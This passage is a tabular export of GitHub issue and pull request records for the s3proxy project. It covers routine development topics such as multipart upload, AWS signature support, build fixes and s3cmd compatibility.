",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/60/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/60/comments,https://api.github.com/repos/gaul/s3proxy/issues/60/events,https://github.com/gaul/s3proxy/pull/60,https://api.github.com/repos/gaul/s3proxy/pulls/60
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/59,74527159,MDExOlB1bGxSZXF1ZXN0MzUwNTQ4MzE=,59,get rid of default blob store,1772540,closed,FALSE,NA,NA,1,2015-05-08T23:19:08Z,2015-07-07T21:23:40Z,2015-07-07T21:23:40Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/59/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/59/comments,https://api.github.com/repos/gaul/s3proxy/issues/59/events,https://github.com/gaul/s3proxy/pull/59,https://api.github.com/repos/gaul/s3proxy/pulls/59
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/58,73381445,MDU6SXNzdWU3MzM4MTQ0NQ==,58,Improve support for Azure multipart upload,848247,closed,FALSE,NA,NA,1,2015-05-05T17:46:36Z,2015-07-17T23:01:42Z,2015-07-17T23:01:42Z,OWNER,NA,"S3 uses a minimum MPU part size of 5 MB while Azure has a maximum part size of 4 MB.  Thus well-behaved S3 applications cannot use multipart upload with Azure.  S3Proxy should break the larger S3 request into multiple smaller Azure MPU requests.  This will require a more sophisticated mapping from S3 part number to Azure block ID.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/58/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/58/comments,https://api.github.com/repos/gaul/s3proxy/issues/58/events,https://github.com/gaul/s3proxy/issues/58,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/57,73124181,MDU6SXNzdWU3MzEyNDE4MQ==,57,use Host header instead of hardcoded config value to do signing,1772540,closed,FALSE,NA,NA,1,2015-05-04T20:46:33Z,2015-05-12T00:46:42Z,2015-05-12T00:46:42Z,COLLABORATOR,NA,"S3Proxy requires `s3proxy.virtual-host` setting to be set to the same value that application is sending. This complicates deployment and doesn't bring much value. S3Proxy should just take the value out from the Host request header.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/57/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/57/comments,https://api.github.com/repos/gaul/s3proxy/issues/57/events,https://github.com/gaul/s3proxy/issues/57,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/56,72541381,MDU6SXNzdWU3MjU0MTM4MQ==,56,Multipart copy,848247,closed,FALSE,NA,NA,0,2015-05-01T22:44:47Z,2015-07-30T21:22:08Z,2015-07-30T21:22:08Z,OWNER,NA,"Presently S3Proxy cannot copy objects larger than 5 GB.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/56/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/56/comments,https://api.github.com/repos/gaul/s3proxy/issues/56/events,https://github.com/gaul/s3proxy/issues/56,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/55,72536031,MDU6SXNzdWU3MjUzNjAzMQ==,55,Release S3Proxy 1.5.0,848247,closed,FALSE,NA,NA,3,2015-05-01T22:14:47Z,2016-11-16T18:53:04Z,2016-11-16T18:53:04Z,OWNER,NA,"Master has three important features: v4 signing #24, native multi-part upload #2, and native copy object #46.  These require pre-release jclouds and we must wait until its next release.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/55/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/55/comments,https://api.github.com/repos/gaul/s3proxy/issues/55/events,https://github.com/gaul/s3proxy/issues/55,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/54,71749908,MDExOlB1bGxSZXF1ZXN0MzQzMjY2MTM=,54,parse authorization header backwards,1772540,closed,FALSE,NA,NA,1,2015-04-29T01:07:42Z,2015-04-29T01:19:47Z,2015-04-29T01:19:47Z,COLLABORATOR,NA,"this is to accomodate using s3proxy with swift backend, which has
a colon in the access key
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/54/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/54/comments,https://api.github.com/repos/gaul/s3proxy/issues/54/events,https://github.com/gaul/s3proxy/pull/54,https://api.github.com/repos/gaul/s3proxy/pulls/54
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/53,71439538,MDExOlB1bGxSZXF1ZXN0MzQyMjQyNTQ=,53,handle empty prefix as if it's missing,1772540,closed,FALSE,NA,NA,1,2015-04-28T00:38:54Z,2015-04-28T21:09:54Z,2015-04-28T21:09:54Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/53/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/53/comments,https://api.github.com/repos/gaul/s3proxy/issues/53/events,https://github.com/gaul/s3proxy/pull/53,https://api.github.com/repos/gaul/s3proxy/pulls/53
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/52,64643882,MDExOlB1bGxSZXF1ZXN0MzIwNjYwNjg=,52,ignore s3proxy idea project file,1772540,closed,FALSE,NA,NA,0,2015-03-26T22:04:43Z,2015-03-26T22:05:58Z,2015-03-26T22:05:58Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/52/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/52/comments,https://api.github.com/repos/gaul/s3proxy/issues/52/events,https://github.com/gaul/s3proxy/pull/52,https://api.github.com/repos/gaul/s3proxy/pulls/52
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/51,64397005,MDExOlB1bGxSZXF1ZXN0MzE5NzcwMDk=,51,Blobstore lookup,1772540,closed,FALSE,NA,NA,1,2015-03-25T23:37:45Z,2015-03-26T00:01:11Z,2015-03-26T00:01:11Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/51/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/51/comments,https://api.github.com/repos/gaul/s3proxy/issues/51/events,https://github.com/gaul/s3proxy/pull/51,https://api.github.com/repos/gaul/s3proxy/pulls/51
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/50,64073550,MDExOlB1bGxSZXF1ZXN0MzE4NTkxMjA=,50,add a way to plumb through different account providers,1772540,closed,FALSE,NA,NA,2,2015-03-24T18:59:56Z,2015-03-24T20:24:51Z,2015-03-24T20:24:42Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/50/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/50/comments,https://api.github.com/repos/gaul/s3proxy/issues/50/events,https://github.com/gaul/s3proxy/pull/50,https://api.github.com/repos/gaul/s3proxy/pulls/50
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/49,62805559,MDU6SXNzdWU2MjgwNTU1OQ==,49,support anonymous bucket and object access to public-read assets,848247,closed,FALSE,NA,NA,1,2015-03-18T21:26:58Z,2015-03-18T23:56:08Z,2015-03-18T23:56:08Z,OWNER,NA,"Now that S3Proxy support `setBucketACL` and `setObjectACL`, it should support anonymous access to public-read buckets and objects.  This requires extending how we do authentication; presently S3Proxy supports only authenticated or anonymous access globally but this should happen at the object level.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/49/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/49/comments,https://api.github.com/repos/gaul/s3proxy/issues/49/events,https://github.com/gaul/s3proxy/issues/49,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/48,60444709,MDU6SXNzdWU2MDQ0NDcwOQ==,48,Support service paths,848247,closed,FALSE,NA,NA,4,2015-03-10T03:10:06Z,2017-03-12T23:55:50Z,2017-03-12T23:55:50Z,OWNER,NA,"Some object stores like Eucalyptus Walrus use service paths, e.g., `https://host/services/Walrus/container-name/blob-name`.  S3Proxy supports these for the S3 back-end via `jclouds.s3.service-path`; it should support them for the front-end as well.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/48/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/48/comments,https://api.github.com/repos/gaul/s3proxy/issues/48/events,https://github.com/gaul/s3proxy/issues/48,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/47,60047714,MDExOlB1bGxSZXF1ZXN0MzA2MTQ5NTQ=,47,Add a test for failure when using v4 signatures.,703870,closed,FALSE,NA,NA,3,2015-03-06T01:58:20Z,2015-03-06T18:54:54Z,2015-03-06T18:54:54Z,CONTRIBUTOR,NA,"Adds a unit test with the Amazon Java SDK for failures when submitting
v4-signed requests.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/47/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/47/comments,https://api.github.com/repos/gaul/s3proxy/issues/47/events,https://github.com/gaul/s3proxy/pull/47,https://api.github.com/repos/gaul/s3proxy/pulls/47
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/46,59884454,MDU6SXNzdWU1OTg4NDQ1NA==,46,native server-side object copy,848247,closed,FALSE,NA,NA,1,2015-03-05T00:14:07Z,2015-04-09T17:28:16Z,2015-04-09T17:28:16Z,OWNER,NA,"S3Proxy emulates server-side copy by performing reads and writes within S3Proxy.  While this is an improvement over client-side copy, instead S3Proxy should implement native support in jclouds via [JCLOUDS-651](https://issues.apache.org/jira/browse/JCLOUDS-651).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/46/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/46/comments,https://api.github.com/repos/gaul/s3proxy/issues/46/events,https://github.com/gaul/s3proxy/issues/46,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/45,58548098,MDExOlB1bGxSZXF1ZXN0Mjk3ODg2OTY=,45,Use maven-assembly-plugin instead of Maven Shade,848247,closed,FALSE,NA,NA,0,2015-02-23T06:34:14Z,2015-02-26T23:17:32Z,2015-02-26T22:50:38Z,OWNER,NA,"This works around MSHADE-183 which prevents use with Maven 3.2.5 and
has caused recent Travis CI failures.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/45/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/45/comments,https://api.github.com/repos/gaul/s3proxy/issues/45/events,https://github.com/gaul/s3proxy/pull/45,https://api.github.com/repos/gaul/s3proxy/pulls/45
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/44,58509723,MDU6SXNzdWU1ODUwOTcyMw==,44,bucket and object canned ACLs,848247,closed,FALSE,NA,NA,6,2015-02-22T17:08:52Z,2015-07-13T21:04:49Z,2015-07-13T21:02:49Z,OWNER,NA,"jclouds 1.9.0 will add bucket and object ACL support via [JCLOUDS-660](https://issues.apache.org/jira/browse/JCLOUDS-660) and [JCLOUDS-732](https://issues.apache.org/jira/browse/JCLOUDS-732).  S3Proxy can easily add get and set ACL RPCs but needs some additional work to pass an authentication context through for unauthenticated reads.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/44/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/44/comments,https://api.github.com/repos/gaul/s3proxy/issues/44/events,https://github.com/gaul/s3proxy/issues/44,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/43,58491033,MDExOlB1bGxSZXF1ZXN0Mjk3NjU5Mzg=,43,Skip install goal due to MSHADE-183,848247,closed,FALSE,NA,NA,1,2015-02-22T05:21:24Z,2015-02-22T05:29:02Z,2015-02-22T05:29:00Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/43/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/43/comments,https://api.github.com/repos/gaul/s3proxy/issues/43/events,https://github.com/gaul/s3proxy/pull/43,https://api.github.com/repos/gaul/s3proxy/pulls/43
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/42,58392442,MDExOlB1bGxSZXF1ZXN0Mjk3MTkyNTU=,42,Use builder to create S3Proxy,848247,closed,FALSE,NA,NA,1,2015-02-20T18:36:05Z,2015-02-20T19:23:55Z,2015-02-20T19:23:45Z,OWNER,NA,"Also hoist sanity checks out of main.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/42/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/42/comments,https://api.github.com/repos/gaul/s3proxy/issues/42/events,https://github.com/gaul/s3proxy/pull/42,https://api.github.com/repos/gaul/s3proxy/pulls/42
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/41,58147345,MDExOlB1bGxSZXF1ZXN0Mjk1NzQ5NjQ=,41,Expose the Jetty state in the S3Proxy interface.,703870,closed,FALSE,NA,NA,0,2015-02-18T23:41:17Z,2015-07-15T23:19:32Z,2015-02-18T23:46:48Z,CONTRIBUTOR,NA,"The commit adds a getState() method, which exposes the Jetty state
to the caller. This is useful to check whether the server is running
or is in some other state.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/41/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/41/comments,https://api.github.com/repos/gaul/s3proxy/issues/41/events,https://github.com/gaul/s3proxy/pull/41,https://api.github.com/repos/gaul/s3proxy/pulls/41
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/40,56726943,MDExOlB1bGxSZXF1ZXN0Mjg3NTk3NDk=,40,Upgrade to Jetty 9.2.7.v20150116,848247,closed,FALSE,NA,NA,0,2015-02-05T20:45:54Z,2015-02-05T20:52:02Z,2015-02-05T20:51:59Z,OWNER,NA,"Changelog:

http://dev.eclipse.org/mhonarc/lists/jetty-announce/msg00072.html
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/40/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/40/comments,https://api.github.com/repos/gaul/s3proxy/issues/40/events,https://github.com/gaul/s3proxy/pull/40,https://api.github.com/repos/gaul/s3proxy/pulls/40
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/39,56465246,MDU6SXNzdWU1NjQ2NTI0Ng==,39,List all command from s3cmd is listing /tmp as my buckets,243851,closed,FALSE,NA,NA,6,2015-02-04T01:07:30Z,2015-02-04T05:38:09Z,2015-02-04T05:01:50Z,NONE,NA,"It seems calling `s3cmd la` is returning the list of directories in `/tmp` as my bucket list - and subsequently causing an exception because a bucket has an underscore in the name.

Can you take a look at s3tools/s3cmd#474 and see what you think please?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/39/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/39/comments,https://api.github.com/repos/gaul/s3proxy/issues/39/events,https://github.com/gaul/s3proxy/issues/39,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/38,55366304,MDU6SXNzdWU1NTM2NjMwNA==,38,maven shade v2.3 plugin is broken,2203987,closed,FALSE,NA,NA,3,2015-01-24T10:24:22Z,2015-02-26T22:50:38Z,2015-02-26T22:50:38Z,NONE,NA,"Hi Andrew, 

FYI: maven shade v2.3 plugin is broken see https://jira.codehaus.org/browse/MSHADE-183

I patched it locally, bumped up the plugin version to 2.3.1 and your pom ran fine!

Regards,
Steve
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/38/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/38/comments,https://api.github.com/repos/gaul/s3proxy/issues/38/events,https://github.com/gaul/s3proxy/issues/38,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/37,55365469,MDU6SXNzdWU1NTM2NTQ2OQ==,37,maven build failing - Failure to find org.apache.jclouds.labs:glacier:jar:2.0.0-SNAPSHOT,2203987,closed,FALSE,NA,NA,1,2015-01-24T09:50:48Z,2015-01-24T12:08:14Z,2015-01-24T12:03:49Z,NONE,NA,"Hi Andrew, it just did a pull and tried to build your code locally with maven and got:

Failure to find org.apache.jclouds.labs:glacier:jar:2.0.0-SNAPSHOT in https://oss.sonatype.org/content/repositories/snapshots 

Do you see this as well?

Regards,
Steve
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/37/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/37/comments,https://api.github.com/repos/gaul/s3proxy/issues/37/events,https://github.com/gaul/s3proxy/issues/37,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/36,55233047,MDExOlB1bGxSZXF1ZXN0Mjc4OTQwNzc=,36,Test S3Proxy with s3-tests,848247,closed,FALSE,NA,NA,0,2015-01-23T01:18:29Z,2015-01-23T01:39:26Z,2015-01-23T01:37:43Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/36/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/36/comments,https://api.github.com/repos/gaul/s3proxy/issues/36/events,https://github.com/gaul/s3proxy/pull/36,https://api.github.com/repos/gaul/s3proxy/pulls/36
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/35,53929222,MDExOlB1bGxSZXF1ZXN0MjcxMzc3MjI=,35,use static function in URLDecoder,1772540,closed,FALSE,NA,NA,0,2015-01-09T23:32:10Z,2015-01-09T23:40:27Z,2015-01-09T23:40:27Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/35/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/35/comments,https://api.github.com/repos/gaul/s3proxy/issues/35/events,https://github.com/gaul/s3proxy/pull/35,https://api.github.com/repos/gaul/s3proxy/pulls/35
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/34,53578746,MDExOlB1bGxSZXF1ZXN0MjY5Mjc1MDA=,34,uri decode path before passing them to lower layers,1772540,closed,FALSE,NA,NA,0,2015-01-06T23:44:00Z,2015-01-07T00:00:03Z,2015-01-07T00:00:03Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/34/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/34/comments,https://api.github.com/repos/gaul/s3proxy/issues/34/events,https://github.com/gaul/s3proxy/pull/34,https://api.github.com/repos/gaul/s3proxy/pulls/34
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/33,53574937,MDExOlB1bGxSZXF1ZXN0MjY5MjUxODY=,33,Allow kernel to pick S3Proxy port in tests,848247,closed,FALSE,NA,NA,1,2015-01-06T23:00:43Z,2015-01-06T23:06:36Z,2015-01-06T23:06:34Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/33/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/33/comments,https://api.github.com/repos/gaul/s3proxy/issues/33/events,https://github.com/gaul/s3proxy/pull/33,https://api.github.com/repos/gaul/s3proxy/pulls/33
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/32,53574194,MDExOlB1bGxSZXF1ZXN0MjY5MjQ2OTQ=,32,add test for % in blob name,1772540,closed,FALSE,NA,NA,0,2015-01-06T22:52:55Z,2015-01-06T23:02:31Z,2015-01-06T23:02:31Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/32/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/32/comments,https://api.github.com/repos/gaul/s3proxy/issues/32/events,https://github.com/gaul/s3proxy/pull/32,https://api.github.com/repos/gaul/s3proxy/pulls/32
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/31,53573704,MDExOlB1bGxSZXF1ZXN0MjY5MjQzOTg=,31,run test in random port,1772540,closed,FALSE,NA,NA,2,2015-01-06T22:47:26Z,2015-01-06T23:06:39Z,2015-01-06T23:06:39Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/31/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/31/comments,https://api.github.com/repos/gaul/s3proxy/issues/31/events,https://github.com/gaul/s3proxy/pull/31,https://api.github.com/repos/gaul/s3proxy/pulls/31
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/30,53472016,MDU6SXNzdWU1MzQ3MjAxNg==,30,create bucket treats authorization errors as bucket already exists,1772540,closed,FALSE,NA,NA,1,2015-01-06T01:57:17Z,2015-11-17T23:59:17Z,2015-11-17T23:59:17Z,COLLABORATOR,NA,"I created an IAM user with incorrect user policy, and when I tried to create a bucket with s3cmd, it gave me errors about bucket already existed instead of the correct error
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/30/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/30/comments,https://api.github.com/repos/gaul/s3proxy/issues/30/events,https://github.com/gaul/s3proxy/issues/30,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/29,53471208,MDExOlB1bGxSZXF1ZXN0MjY4NjQ4Mzc=,29,provide reason for access denied,1772540,closed,FALSE,NA,NA,2,2015-01-06T01:45:29Z,2015-03-03T20:48:31Z,2015-03-03T19:34:57Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/29/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/29/comments,https://api.github.com/repos/gaul/s3proxy/issues/29/events,https://github.com/gaul/s3proxy/pull/29,https://api.github.com/repos/gaul/s3proxy/pulls/29
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/28,53433429,MDExOlB1bGxSZXF1ZXN0MjY4NDUxNDQ=,28,make S3Proxy contructor public,1772540,closed,FALSE,NA,NA,1,2015-01-05T19:33:14Z,2015-01-05T19:40:15Z,2015-01-05T19:40:15Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/28/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/28/comments,https://api.github.com/repos/gaul/s3proxy/issues/28/events,https://github.com/gaul/s3proxy/pull/28,https://api.github.com/repos/gaul/s3proxy/pulls/28
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/27,53356369,MDExOlB1bGxSZXF1ZXN0MjY4MDI2ODA=,27,Add Checkstyle to verify target,848247,closed,FALSE,NA,NA,0,2015-01-05T01:27:35Z,2015-01-05T01:30:40Z,2015-01-05T01:30:36Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/27/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/27/comments,https://api.github.com/repos/gaul/s3proxy/issues/27/events,https://github.com/gaul/s3proxy/pull/27,https://api.github.com/repos/gaul/s3proxy/pulls/27
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/26,53296817,MDExOlB1bGxSZXF1ZXN0MjY3ODAyOTg=,26,Emulate multipart upload with single-part uploads,848247,closed,FALSE,NA,NA,2,2015-01-03T06:59:22Z,2015-03-02T23:09:51Z,2015-03-02T23:05:36Z,OWNER,NA,"This approach requires three times as many operations as the optimal
approach.  Implementing this correctly requires exposing the
underlying multipart operations in jclouds.  Most s3-tests pass but
two still fail:

test_multipart_upload_size_too_small
test_list_multipart_upload

References #2.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/26/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/26/comments,https://api.github.com/repos/gaul/s3proxy/issues/26/events,https://github.com/gaul/s3proxy/pull/26,https://api.github.com/repos/gaul/s3proxy/pulls/26
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/25,53156633,MDU6SXNzdWU1MzE1NjYzMw==,25,Use proper encapsulation library to emit XML,848247,closed,FALSE,NA,NA,0,2014-12-30T23:36:53Z,2015-01-12T04:48:39Z,2015-01-12T04:48:39Z,OWNER,NA,"s3proxy emits unescaped strings in its XML output, e.g., bucket and object names.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/25/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/25/comments,https://api.github.com/repos/gaul/s3proxy/issues/25/events,https://github.com/gaul/s3proxy/issues/25,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/24,49347783,MDU6SXNzdWU0OTM0Nzc4Mw==,24,AWS signature V4,848247,closed,FALSE,NA,NA,2,2014-11-19T08:32:41Z,2016-01-08T23:32:52Z,2016-01-08T23:32:52Z,OWNER,NA,"Amazon allows V2 signatures for old regions and requires [V4 signatures](http://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html) for new regions like eu-central-1 (Frankfurt).  jclouds plans to move to V4 by default for aws-s3 [JCLOUDS-480](https://issues.apache.org/jira/browse/JCLOUDS-480) so we must support V4 to allow jclouds applications to use S3Proxy.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/24/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/24/comments,https://api.github.com/repos/gaul/s3proxy/issues/24/events,https://github.com/gaul/s3proxy/issues/24,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/23,49302056,MDExOlB1bGxSZXF1ZXN0MjQ2NDk4MDU=,23,more required parameters needed for signing,1772540,closed,FALSE,NA,NA,8,2014-11-18T22:24:33Z,2014-11-20T03:32:19Z,2014-11-20T03:32:19Z,COLLABORATOR,NA,"allows s3cmd info s3://bucket/ to work
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/23/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/23/comments,https://api.github.com/repos/gaul/s3proxy/issues/23/events,https://github.com/gaul/s3proxy/pull/23,https://api.github.com/repos/gaul/s3proxy/pulls/23
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/22,49196327,MDExOlB1bGxSZXF1ZXN0MjQ1OTY0MDI=,22,more compatibility fixes for s3cmd,1772540,closed,FALSE,NA,NA,3,2014-11-18T08:56:24Z,2014-11-18T09:15:55Z,2014-11-18T09:15:55Z,COLLABORATOR,NA,"s3cmd uses virtual hostname for bucket name, with the host header
including the port. need to strip out the port to find out the
bucket name

also includes a small fix for x-amz-date, according to the
documentation we should always use empty string for date
when x-amz-date is included
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/22/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/22/comments,https://api.github.com/repos/gaul/s3proxy/issues/22/events,https://github.com/gaul/s3proxy/pull/22,https://api.github.com/repos/gaul/s3proxy/pulls/22
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/21,49173838,MDExOlB1bGxSZXF1ZXN0MjQ1ODUxOTI=,21,Swift remote documentation,1772540,closed,FALSE,NA,NA,2,2014-11-18T02:44:22Z,2015-01-03T00:53:53Z,2015-01-03T00:53:53Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/21/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/21/comments,https://api.github.com/repos/gaul/s3proxy/issues/21/events,https://github.com/gaul/s3proxy/pull/21,https://api.github.com/repos/gaul/s3proxy/pulls/21
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/20,49173509,MDExOlB1bGxSZXF1ZXN0MjQ1ODUwMDU=,20,http header name is case insensitive,1772540,closed,FALSE,NA,NA,2,2014-11-18T02:39:01Z,2014-11-18T02:47:45Z,2014-11-18T02:47:45Z,COLLABORATOR,NA,"fixes compatibility with s3cmd
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/20/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/20/comments,https://api.github.com/repos/gaul/s3proxy/issues/20/events,https://github.com/gaul/s3proxy/pull/20,https://api.github.com/repos/gaul/s3proxy/pulls/20
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/19,45820034,MDU6SXNzdWU0NTgyMDAzNA==,19,HTTP 204 code for DELETE requests,794478,closed,FALSE,NA,NA,2,2014-10-15T01:24:13Z,2014-10-15T01:39:07Z,2014-10-15T01:39:07Z,NONE,NA,"Expected the status code to be `200` or `202` for a `DELETE`:

```
% curl -i -H'Content-type: text/plain' -XPUT 192.168.42.43:8080/foo/bar -d 'test'
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2014 23:58:35 GMT
